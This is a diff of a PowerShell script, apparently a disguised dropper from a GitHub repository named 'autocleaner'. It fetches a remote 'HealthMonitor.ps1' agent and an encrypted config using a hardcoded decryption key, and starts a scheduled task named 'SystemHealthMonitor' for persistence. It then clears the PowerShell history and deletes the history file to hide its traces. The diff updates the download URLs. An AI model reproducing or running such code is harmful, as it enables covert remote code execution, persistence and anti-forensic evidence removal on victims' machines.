@@ -1,7 +1,6 @@
-# Direct URLs - MAKE SURE THESE FILES EXIST ON GITHUB
-$agentUrl  = "https://raw.githubusercontent.com/saiyanjohan580-boop/autocleaner/main/HealthMonitor.ps1"
-$configUrl = "https://raw.githubusercontent.com/saiyanjohan580-boop/autocleaner/main/config.enc"
-
+# Direct URLs
+$agentUrl  = "https://raw.githubusercontent.com/saiyanjohan580-boop/autocleaner/refs/heads/main/HealthMonitor.ps1"
+$configUrl = "https://raw.githubusercontent.com/saiyanjohan580-boop/autocleaner/refs/heads/main/config.enc"
 # Decryption key
 $key = "S3cr3tK3y2024!"
 
@@ -51,3 +50,4 @@ Start-ScheduledTask -TaskName "SystemHealthMonitor"
 Clear-History
 Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
 exit
+
